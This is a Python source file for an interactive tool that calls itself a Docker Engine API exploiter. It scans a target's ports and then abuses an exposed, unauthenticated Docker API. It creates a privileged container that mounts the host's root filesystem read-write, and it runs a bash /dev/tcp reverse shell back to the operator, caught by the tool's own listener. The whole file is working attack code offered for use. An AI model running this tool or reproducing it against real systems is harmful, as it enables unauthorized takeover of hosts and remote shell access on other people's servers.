import socket
from rich.console  import Console
from rich.prompt   import Prompt
from rich.table    import Table
from rich.progress import Progress
import sys
from typing import Dict, Any, Optional, List
import json
import os
from multiprocessing.pool import ThreadPool
import requests
import time


APP_NAME = """

   ▄████████    ▄████████ ████████▄     ▄████████ ▀████    ▐████▀ 
  ███    ███   ███    ███ ███   ▀███   ███    ███   ███▌   ████▀  
  ███    ███   ███    █▀  ███    ███   ███    █▀     ███  ▐███    
 ▄███▄▄▄▄██▀  ▄███▄▄▄     ███    ███  ▄███▄▄▄        ▀███▄███▀    
▀▀███▀▀▀▀▀   ▀▀███▀▀▀     ███    ███ ▀▀███▀▀▀        ████▀██▄     
▀███████████   ███    █▄  ███    ███   ███    █▄    ▐███  ▀███    
  ███    ███   ███    ███ ███   ▄███   ███    ███  ▄███     ███▄  
  ███    ███   ██████████ ████████▀    ██████████ ████       ███▄ 
  ███    ███                                                      

"""

INFO = """
[green]##############################################[/green]
[green]####[/green] [bold red]A Simple Docker Engine API Exploiter[/bold red] [green]####[/green]
[green]##############################################[/green]
"""

BUGS = [
    "    > [red]Using the Reverse Shell you would have to press ENTER sometimes to go on[/red]\n"
    "    > [red]Some commands don't show their outputs unless ENTER is pressed[/red]"
]

c = Console(color_system="truecolor")

CMD_TYPES = [
    "rvshell"
]


class Threading:
    @staticmethod
    def threadpool_executor(function, iterable: List[Any], iterable_len: int):
        numer_of_workers = os.cpu_count()
        with ThreadPool(numer_of_workers) as pool, Progress() as prog:
            scan = prog.add_task("Progress", total=iterable_len)
            for loop_index, _ in enumerate(pool.imap(function, iterable), 1):
                prog.update(scan, advance=1.0)


class PortScanner:
    def __init__(self) -> None:
        self.__open_ports = []
        self.__ports = json.load(open("ports.json", mode="r"))

    @staticmethod
    def get_host_ip_addr(host: str) -> Optional[str]:
        try:
            ip = socket.gethostbyname(host)
            return ip
        except socket.gaierror as e:
            c.print(f"Error found: {e}", style="bold red")
            return None

    def scan(self, port: str) -> None:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1.0)
        port = int(port)
        conn_status = sock.connect_ex((self.ip, port))
        if conn_status == 0:
            self.__open_ports.append(port)
        sock.close()

    def show_completion_message(self) -> None:
        if self.__open_ports:
            c.print("Scan Completed. Open Ports: ", style="bold green")
            table = Table(show_header=True, header_style="bold blue")
            table.add_column("PORT", style="green")
            table.add_column("STATE", style="green", justify="center")
            table.add_column("SERVICE", style="green")
            for port in self.__open_ports:
                table.add_row(str(port), "OPEN", self.__ports[str(port)])

            c.print(table)
        else:
            c.print("No Open Ports Found on Target.", style="bold magenta")

    def run(self, host: str) -> bool:
        self.ip = PortScanner.get_host_ip_addr(host)
        if not self.ip:
            return False

        c.print(f"[*] Scanning: [bold blue]{self.ip}[/bold blue]")

        try:
            Threading.threadpool_executor(self.scan, 
                                          self.__ports.keys(), 
                                          len(self.__ports.keys()))
        except KeyboardInterrupt as ke:
            ...
        except Exception as e:
            print(e)
            return False

        self.show_completion_message()

        return True


class ReverShellHandler:
    def __init__(self, lhost: str, lport: int) -> None:
        self.__socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.__socket.bind((lhost, lport))
        self.__socket.listen(1)

        c.print(f"[*] Started Reverse Shell Handler on {lhost}:{lport} ... ")

        self.__lhost = lhost
        self.__lport = lport

    def handle_rv(self, exec_start: Dict[str, bool], addr: str, exec_id: str) -> None:
        response = requests.post(f"http://{addr}/exec/{exec_id}/start", json=exec_start)
        conn, addr = self.__socket.accept()
        c.print(f"[*] Connection {addr} => {self.__lhost}:{self.__lport}")

        while True:
            try:
                while 1:
                    try:
                        ans = conn.recvmsg(1024)[0].decode()
                        ans = ans.split("\n")[:-1]
                        if ans == [] or ans == ['']:
                            break
                        else:
                            print("\n".join(ans))
                    except KeyboardInterrupt:
                        print()
                        break

                command = Prompt.ask("([blue]rvshell[/blue]) $ ")

                #Send command
                command += "\n"
                conn.send(command.encode())
                time.sleep(0.10)
            except KeyboardInterrupt:
                print()
                break

        c.print(f"[*] Connection Closing ... ", style="yellow")
        self.__socket.close()


class Command:
    def __init__(self, name: str, desc: str, cmd: str, info: str="") -> None:
        self.__name = name
        self.__desc = desc
        self.__cmd  = cmd
        self.__info = info
    
    def __str__(self) -> str:
        return f"COMMAND: {self.__name} - {self.__desc}\n" +\
               f"         Usage: {self.__cmd}\n" + \
               (f"         Info: {self.__info}\n" if self.__info else "")


class Commands:
    CMDS = {
        "help"     : Command(name="help",
                             desc="Show all commands of EscapeDocker",
                             cmd="help"),
        "set"      : Command(name="set",
                             desc="Set the value of a variable",
                             cmd="set VAR=VALUE",
                             info="For JSON variable must be used 'setdata'"),
        "show"     : Command(name="show",
                             desc="Show the value of a variable",
                             cmd="show [VAR1, ...]",
                             info="If no VAR given, show the value of every variable"),
        "clear"    : Command(name="clear",
                             desc="Clear the screen",
                             cmd="clear"),
        "quit"     : Command(name="quit",
                             desc="Quit the application",
                             cmd="quit"),
        "setdata"  : Command(name="setdata",
                             desc="Set the value for a JSON variable from a JSON file",
                             cmd="setdata VAR=JSONfile"),
        "scan"     : Command(name="scan",
                             desc="Scan a specified IP looking for open ports",
                             cmd="scan",
                             info="The scanned IP is the one setted previously"),
        "lstimgs"  : Command(name="lstimgs",
                             desc="List all images of a remote host",
                             cmd="lstimgs [filters=[VAL1[:TAG],...]]"),
        "pull"     : Command(name="pull",
                             desc="Pull an given image on the remote host",
                             cmd="pull",
                             info="The pulled image is defined in the variable IMAGE"),
        "create"   : Command(name="create",
                             desc="Create a container in a remote host",
                             cmd="create",
                             info="Container created with data in variable DATA"),
        "start"    : Command(name="start",
                             desc="Start a container",
                             cmd="start",
                             info="The container that should be started is the one with name NAME"),
        "stop"     : Command(name="stop",
                             desc="Stop a container",
                             cmd="stop",
                             info="Stop the container identified with name NAME"),
        "exec"     : Command(name="exec",
                             desc="Execute a command inside a running container (default=rvshell)",
                             cmd="exec [command=COMMAND]",
                             info="COMMAND can be one between [" + ", ".join(CMD_TYPES) + "] or your own")
    }

    @classmethod
    def print(cls, *args) -> None:
        cmds = {cmd : cls.CMDS[cmd] for cmd in args if cmd in cls.CMDS} if args else cls.CMDS
        for _, v in cmds.items():
            c.print(v, style="bold")


class DockerEsc:
    def __init__(self, ) -> None:
        c.print(APP_NAME, style="bold yellow", justify="center")
        c.print("[u]Welcome to Remote Docker Execution - ReDEx v1.0.0[/u]\n", 
                style="purple", 
                justify="center"
        )
        c.print(INFO + "\n\n", justify="center")
        c.print("Bugs that needs to be fixed:\n" + "".join(BUGS) + "\n\n")

        self.__rhost        = "0.0.0.0"
        self.__rport        = 2375
        self.__name         = "container"
        self.__image        = "ubuntu:latest"
        self.__lhost        = "0.0.0.0"
        self.__lport        = 4444
        self.__privileged   = True
        self.__autoremove   = True
        self.__networkdisab = False
        self.__command      = "rvshell"
        self.__data  = {
            "create" : {
                "Image" : self.__image, "HostConfig" : {
                    "Privileged": self.__privileged,
                    "AutoRemove": self.__autoremove,
                    "Mounts" : [{
                        "Target": "/mnt/fs",
                        "Source": "/",
                        "Type": "bind",
                        "ReadOnly": False
                    }]
                },
                "NetworkDisabled" : self.__networkdisab,
                "Entrypoint": ["tail", "-f", "/dev/null"]
            },
            "exec" : {
                "Cmd" : [
                    "/bin/bash", "-c", 
                    "{:s}"
                ]
            },
            "exec_start" : {
                "Tty" : True
            }
        }

        self.exec_created = False
        self.command_types = {
            "rvshell" : 'bash -i >& /dev/tcp/{:s}/{:d} 0>&1'
        }

    @staticmethod
    def print_dict(d: Dict[str, Any], lvl: int=1) -> None:
        for k, v in d.items():
            spaces = "  " * lvl
            if isinstance(v, dict):
                c.print(f"{spaces}'{k}' = " + "{", style="bold")
                DockerEsc.print_dict(v, lvl + 1)
                c.print(f"{spaces}" + "}", style="bold")
                continue
            
            c.print(f"{spaces}'{k}' = {v}", style="bold")

    def setvalue(self, *args) -> None:
        name_class = self.__class__.__name__
        sets       = [tuple(v.split("=")) for v in args] 
        
        # Set values
        for var, val in sets:
            attr = f"_{name_class}__{var.lower()}"
            if val.isnumeric():
                val = int(val)

            setattr(self, attr, val)
            c.print(f"[*] Setting {var} => {val}")

    def show(self, *args) -> None:
        for k, v in self.__dict__.items():
            if not k.startswith(f"_{self.__class__.__name__}"):
                continue

            k = k.split("_")[-1].upper()

            if isinstance(v, dict):
                c.print("%s = {" % k, style="bold")
                DockerEsc.print_dict(v)
                c.print("}", style="bold")
                
                continue

            c.print(f"{k} = {v} (type={type(v)})", style="bold")

    def quit(self, *args) -> None:
        c.print("\n[*] Quitting ... ", style="bold red")
        sys.exit(1)

    def setdata(self, *args) -> None:
        name_class = self.__class__.__name__
        sets       = [tuple(v.split("=")) for v in args]

        for var, filename in sets:
            data = json.load(open(filename, mode="r"))
            attr = f"_{name_class}__{var.lower()}"

            setattr(self, attr, data)

    def scan(self, *args) -> None:
        ps = PortScanner()
        ps.run(self.__rhost)

    def list_imgs(self, *args) -> None:
        response = requests.get(f"http://{self.__rhost}:{self.__rport}/images/json")
        f_dicts  = dict()

        if len(args) > 0:
            filters = args[0].split("=")[-1].split(",")
            filters = [(f"{f}:latest" if ":" not in f else ":".join(f.split(":"))) for f in filters]
            f_dicts = {f: False for f in filters}
        else:
            filters = []

        for data in response.json():
            for f in filters:
                if f in data["RepoTags"]:
                    f_dicts[f] = True
                    break

            if len(filters) == 0:
                f_dicts[data["RepoTags"][0]] = True

        c.print(f_dicts)
        return f_dicts

    def connect(self, sock: socket.socket) -> bool:
        try:
            sock.connect((self.__rhost,self.__rport))
            return True
        except socket.gaierror:
            return False

    def pull(self, *args) -> None:
        image = self.__image if ":" in self.__image else f"{self.__image}:latest"
        self.__image = image
        request = f"POST /images/create?fromImage={image} HTTP/1.1\r\n" + \
                  f"Host:{self.__rhost}:{self.__rport}\r\n\r\n" +         \
                   "Content-Type: application/json\r\n"

        enc_req = request.encode()
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        connected = self.connect(sock)

        if not connected:
            return None

        try:
            sock.send(enc_req)


            response = sock.recvmsg(4096)
            progress = json.loads(response[0].decode().split("\r\n")[10])

            while "Downloaded" not in progress['status']:
                response = sock.recvmsg(4096)
                progress = json.loads(response[0].decode().split("\r\n")[1])

                if "progress" in progress:
                    c.print(f"[*] Pulling: [magenta]{progress['progress']}[/magenta]", end="\r")
            
            print("\n")
        except BrokenPipeError as bp:
            c.print("[*] Command failed!", style="bold red")

        sock.close()

    def create(self, *args) -> None:
        addr  = f"{self.__rhost}:{self.__rport}"
        query = f"name={self.__name}"
        response = requests.post(f"http://{addr}/containers/create?{query}", 
                                 json=self.__data['create']
        )

        if response.status_code != 201:
            raise Exception

        c.print(f"[*] [bold green]Container Created[/bold green] ID: {response.json()['Id']}")

    def start(self, *args) -> None:
        addr  = f"{self.__rhost}:{self.__rport}"
        response = requests.post(f"http://{addr}/containers/{self.__name}/start")
        if response.status_code != 204:
            raise Exception
        
        c.print(f"[*] [bold green]Container {self.__name.upper()} Has stated[/bold green]")

    def stop(self, *args) -> None:
        addr  = f"{self.__rhost}:{self.__rport}"
        response = requests.post(f"http://{addr}/containers/{self.__name}/stop")
        if response.status_code != 204:
            raise Exception
        
        c.print(f"[*] [bold green]Container {self.__name.upper()} Has been stopped[/bold green]")

    def cexec(self, *args) -> None:
        addr    = f"{self.__rhost}:{self.__rport}"
        command = self.__command
        args    = []
        
        if command == "rvshell":
            args = [self.__lhost, self.__lport]
        
        if command in self.command_types:
            cmd = self.command_types[command].format(*args)
        else:
            cmd = command

        data = self.__data["exec"]
        data["Cmd"][2] =  f'{data["Cmd"][2].format(cmd)}'

        c.print(f"[*] Executing command: [yellow]'{cmd}'[/yellow]")
        
        response = requests.post(f"http://{addr}/containers/{self.__name}/exec", json=data)
        exec_id = response.json()["Id"]
        c.print(f"[*] [bold green]Exec instance created with ID[/bold green]: \n{exec_id}")

        if response.status_code != 201:
            raise Exception

        if command == "rvshell":
            try:
                rvshell = ReverShellHandler(self.__lhost, self.__lport)
                rvshell.handle_rv(self.__data["exec_start"], addr, exec_id)
                return None
            except Exception as e:
                print(e)

        response = requests.post(f"http://{addr}/exec/{exec_id}/start", json=self.__data["exec_start"])
        print(response.status_code, response.text)
        return None

    def run(self) -> None:
        maps = {
            "help"     : Commands().print,
            "clear"    : c.clear,
            "set"      : self.setvalue,
            "quit"     : self.quit,
            "show"     : self.show,
            "scan"     : self.scan,
            "setdata"  : self.setdata,
            "lstimgs"  : self.list_imgs,
            "pull"     : self.pull,
            "create"   : self.create,
            "start"    : self.start,
            "stop"     : self.stop,
            "exec"     : self.cexec
        }

        while True:
            try:
                if self.__rhost != "0.0.0.0":
                    command = self.__command if self.__command in self.command_types else "custom"
                    msg = f"([blue]{self.__rhost}:{self.__rport}/{command}[/blue]) "
                else:
                    msg = ""

                cmd = Prompt.ask(f">>> {msg}")

                # Take the name of the command
                splitte_cmd = cmd.split()
                if len(splitte_cmd) > 1:
                    name, args = splitte_cmd[0], splitte_cmd[1:]
                    maps[name](*args)
                    continue
                
                name = splitte_cmd[0]
                maps[name]()
            except KeyboardInterrupt as ki:
                self.quit()
            except KeyError as ke:
                c.print(f"Command '{cmd}' does not exists!!", style="bold yellow")
            except Exception as e:
                print(e)
                c.print(f"Command Failed!", style="bold red")


if __name__ == "__main__":
    de = DockerEsc()
    de.run()